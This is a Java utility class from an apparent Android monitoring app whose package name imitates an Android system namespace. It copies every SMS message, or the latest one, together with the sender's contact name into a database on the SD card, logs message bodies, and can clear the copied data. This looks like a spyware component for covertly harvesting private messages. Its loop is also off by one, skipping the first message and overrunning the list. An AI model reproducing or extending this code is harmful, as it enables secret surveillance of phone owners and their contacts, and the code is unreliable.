package com.android.system.controled.util;

import java.util.ArrayList;

import com.android.system.controled.Debug;
import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.SmsInfo;
import com.android.system.controled.db.SdcardDbOpera;

public class SmsSaveOutUtil {

	private static SdcardDbOpera mAllsmsTable;
	private static SmsProviderUtil mSmsGetContent;

	private static SmsSaveOutUtil mInstence;
	
	private SmsSaveOutUtil() {
		
	}
	
	public static  SmsSaveOutUtil getInstence() {
		if(mAllsmsTable == null) {
			mAllsmsTable = SdcardDbOpera.getInstence();
		}
		
		if(mSmsGetContent == null) {
			mSmsGetContent = SmsProviderUtil.getInstence();
		}
		if(mInstence == null) {
			mInstence = new SmsSaveOutUtil();
		}
		return mInstence;
	}

	/**
	 * 保存所有信息
	 * 
	 * @Description:
	 * @param folder
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void saveAllSms(String folder) {

		ArrayList<SmsInfo> allSms = new ArrayList<SmsInfo>();
		allSms = mSmsGetContent.getAllSmsInfo(folder);

		int smsSize = allSms.size();
		for (int o = 1; o <= smsSize; o++) {
			try {
				mAllsmsTable.insertNewSms(allSms.get(o), ContactsUtil.getNameFromContactsByNumber(MainApplication.getInstence(), allSms.get(o).getAddress()));
			} catch (Exception e) {
				e.printStackTrace();
			}

		}

	}

	/**
	 * 保存最新的短信记录
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void saveLastSms() {
		SmsInfo oneSms = mSmsGetContent.getLastSmsInfo();
		Debug.v("SmsSaveOutUtil", "Save Msg Last One:  " + oneSms.getBody());

		try {
			mAllsmsTable.insertNewSms(oneSms, ContactsUtil.getNameFromContactsByNumber(MainApplication.getInstence(), oneSms.getAddress()));
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * 清空数据库
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void deleteAllMsg() {
		Debug.e("SmsSaveOutUtil", "deleteAllMsg!");
		try {
			mAllsmsTable.deleteAllSms();
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
	
	
}
